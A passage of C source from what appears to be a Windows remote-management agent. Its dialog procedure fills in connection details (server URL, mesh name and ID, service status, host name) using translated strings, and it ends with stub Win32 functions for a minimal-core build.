			SetWindowTextW(GetDlgItem(hDlg, IDC_VERSIONTEXT), ILibUTF8ToWide(SOURCE_COMMIT_DATE, -1));

			// Set Tooltip for ServerLocation
			HWND hServerLocationHWND = GetDlgItem(hDlg, IDC_SERVERLOCATION);
			HWND hToolTip = CreateWindowExW(0, TOOLTIPS_CLASSW, NULL, WS_POPUP | TTS_NOPREFIX | TTS_ALWAYSTIP, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, hDlg, NULL, GetModuleHandle(NULL), NULL);
			DWORD _e = GetLastError();
			if (hToolTip != NULL && hServerLocationHWND != NULL)
			{
				// Associate the tooltip
				TOOLINFOW toolInfo = { 0 };
				toolInfo.cbSize = sizeof(TOOLINFOW);
				toolInfo.hwnd = hDlg;
				toolInfo.uFlags = TTF_IDISHWND | TTF_SUBCLASS;
				toolInfo.uId = (UINT_PTR)hServerLocationHWND;
				toolInfo.lpszText = ILibUTF8ToWide((serverurl != NULL) ? serverurl : "(None)", -1);
				toolInfo.hinst = GetModuleHandle(NULL);

				SendMessageW(hToolTip, TTM_ADDTOOLW, 0, (LPARAM)&toolInfo);
			}


			duk_push_heapptr(g_dialogCtx, g_dialogTranslationObject); // [obj]
			if (duk_has_prop_string(g_dialogCtx, -1, g_dialogLanguage))
			{
				duk_get_prop_string(g_dialogCtx, -1, g_dialogLanguage);
				agentstatus = Dialog_GetTranslation(g_dialogCtx, "statusDescription");
				if (agentstatus != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_AGENTSTATUS_TEXT), agentstatus); }
				agentversion = Dialog_GetTranslation(g_dialogCtx, "agentVersion");
				if (agentversion != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_AGENT_VERSION), agentversion); }
				serverlocation = Dialog_GetTranslation(g_dialogCtx, "url");
				if (serverlocation != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_SERVER_LOCATION), serverlocation); }
				serveridentifier = Dialog_GetTranslation(g_dialogCtx, "serverId");
				if (serveridentifier != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_SERVER_IDENTIFIER), serveridentifier); }
				groupname = Dialog_GetTranslation(g_dialogCtx, "meshName");
				if (groupname != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_MESH_NAME), groupname); }
				meshidentitifer = Dialog_GetTranslation(g_dialogCtx, "meshId");
				if (meshidentitifer != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_MESH_IDENTIFIER), meshidentitifer); }
				oktext = Dialog_GetTranslation(g_dialogCtx, "ok");
				if (oktext != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDOK), oktext); }
				dialogtitle = Dialog_GetTranslation(g_dialogCtx, "connectionDetailsTitle");
				if (dialogtitle != NULL) { SetWindowTextW(hDlg, dialogtitle); }

				duk_get_prop_string(g_dialogCtx, -1, "status");	// [Array]
				state_notinstalled = Dialog_GetTranslationEx(g_dialogCtx, Duktape_GetStringPropertyIndexValue(g_dialogCtx, -1, 0, NULL));
				state_running = Dialog_GetTranslationEx(g_dialogCtx, Duktape_GetStringPropertyIndexValue(g_dialogCtx, -1, 1, NULL));
				state_notrunning = Dialog_GetTranslationEx(g_dialogCtx, Duktape_GetStringPropertyIndexValue(g_dialogCtx, -1, 2, NULL));

				// Get the current service running state
				int r = GetServiceState(meshServiceName);
				switch (r)
				{
				case SERVICE_RUNNING:
					SetWindowTextW(GetDlgItem(hDlg, IDC_STATUSTEXT), state_running);
					break;
				case 0:
				case 100: // Not installed
					SetWindowTextW(GetDlgItem(hDlg, IDC_STATUSTEXT), state_notinstalled);
					break;
				default: // Not running
					SetWindowTextW(GetDlgItem(hDlg, IDC_STATUSTEXT), state_notrunning);
					break;
				}
				char osnametmp[255];
				#ifdef WIN32
					// This is only supported on Windows 8 and above
					HMODULE wsCORE = LoadLibraryExA((LPCSTR)"Ws2_32.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
					GetHostNameWFunc ghnw = NULL;
					if (wsCORE != NULL)
					{
						if ((ghnw = (GetHostNameWFunc)GetProcAddress(wsCORE, (LPCSTR)"GetHostNameW")) == NULL)
						{
							FreeLibrary(wsCORE);
							wsCORE = NULL;
						}
					}
					if (ghnw != NULL)
					{
						WCHAR whostname[MAX_PATH];
						if (ghnw(whostname, MAX_PATH) == 0)
						{
							WideCharToMultiByte(CP_UTF8, 0, whostname, -1, osnametmp, (int)sizeof(osnametmp), NULL, NULL);
						}
					}
					else
					{
						gethostname(osnametmp, (int)sizeof(osnametmp));
					}
					if (wsCORE != NULL)
					{
						FreeLibrary(wsCORE);
						wsCORE = NULL;
					}
				#else
					gethostname(osnametmp, (int)sizeof(osnametmp));
				#endif
				osname = Dialog_GetTranslationEx(g_dialogCtx, osnametmp);
				SetWindowTextW(GetDlgItem(hDlg, IDC_OSNAME), osname);
			}
		}
		break;
	}
	case WM_COMMAND: 
	{
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCLOSE || LOWORD(wParam) == IDCANCEL)
		{
			autoproxy_checked = IsDlgButtonChecked(hDlg, IDC_AUTOPROXY_CHECK);

			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
	}
	}
	return (INT_PTR)FALSE;
}


#ifdef _MINCORE
BOOL WINAPI AreFileApisANSI(void) { return FALSE; }
VOID WINAPI FatalAppExitA(_In_ UINT uAction, _In_ LPCSTR lpMessageText) {}
HANDLE WINAPI CreateSemaphoreW(_In_opt_  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, _In_ LONG lInitialCount, _In_ LONG lMaximumCount, _In_opt_ LPCWSTR lpName)
{
	return 0;
}
#endif
